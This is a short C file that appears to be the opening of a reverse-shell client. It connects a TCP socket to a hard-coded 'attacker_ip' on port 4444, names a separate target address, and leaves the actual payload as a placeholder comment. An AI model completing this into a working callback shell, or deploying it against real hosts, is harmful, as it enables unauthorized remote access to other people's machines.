#include <stdio.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <string.h>
#include <stdlib.h> 
#include <sys/types.h>  
#include <sys/wait.h>

const char* attacker_ip = "127.0.0.1"; //TODO: make dynamic
const char* target_ip = "1.0.0.1"; //TODO: make dynamic
const char* attacker_port = "4444";
int port = 4444;

int main() {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return -1;
        } 
    struct sockaddr_in servaddr; // sockaddr_in is used for IPv4 addresses.
    memset(&servaddr, 0, sizeof(servaddr)); // Clear the structure.
    servaddr.sin_family = AF_INET; // IPv4 address family
    servaddr.sin_port = htons(port); // Convert port to network byte order
    inet_pton(AF_INET, attacker_ip, &servaddr.sin_addr); // Convert IP address to binary form

    if (connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
        perror("Connection failed");
        return -1;
    }

    // ... rest of the code ...

    close(sockfd);
    return 0;
}
